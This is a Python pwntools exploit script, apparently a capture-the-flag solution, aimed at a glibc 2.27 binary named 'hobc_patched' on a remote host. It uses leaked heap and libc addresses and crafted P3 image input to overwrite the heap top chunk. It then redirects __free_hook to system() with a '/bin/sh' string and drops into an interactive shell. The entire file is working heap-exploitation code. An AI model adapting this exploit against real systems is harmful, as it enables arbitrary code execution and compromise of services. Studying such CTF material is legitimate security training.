from pwn import *

elf = ELF("./hobc_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)
context.binary = elf

def u64v(b: bytes) -> int:
    return u64(b.ljust(8, b'\x00'))

gdbscript = '''
c
'''

#io = process([elf.path])
#pwnlib.gdb.attach(io, exe=elf.path, gdbscript=gdbscript)

io = remote("chungus.hkn", 1024)

io.recvuntil(b"Oh no my pointers are leaky ")
heap_leak = int(io.recvuntil(b" ",drop=True), 16) - 0x260
libc.address = int(io.recvuntil(b"\n", drop=True), 16) - libc.symbols["malloc"]

print("heap:", hex(heap_leak))
print("libc:", hex(libc.address))

pause()

io.sendline(b"P3")

MAX_IMG_SIZE = 1024*10
size = 0x2810

io.sendline(f"{size} {1}".encode())

max_val = (libc.symbols["__free_hook"] - 0x8) - (heap_leak + 0x2aa0) - 0xf
io.sendline(f"{max_val}".encode())

numbers = []
numbers += [0] * (ord('/') - 2)
numbers += [1] * ord('b')
numbers += [2] * ord('i')
numbers += [3] * ord('n')
numbers += [4] * ord('/')
numbers += [5] * ord('s')
numbers += [6] * ord('h')

data = p64(libc.symbols["system"])
numbers += [8] * data[0]
numbers += [9] * data[1]
numbers += [10] * data[2]
numbers += [11] * data[3]
numbers += [12] * data[4]
numbers += [13] * data[5]
numbers += [14] * data[6]
numbers += [15] * data[7]

assert len(numbers) <= 0x2808
numbers += [255] * (0x2808 - len(numbers))

# Overwrite topchunk with 0xffffffffffffffff
numbers += [255] * 8

io.send(b" ".join(str(i).encode() for i in numbers) + b" \x00")

io.interactive()

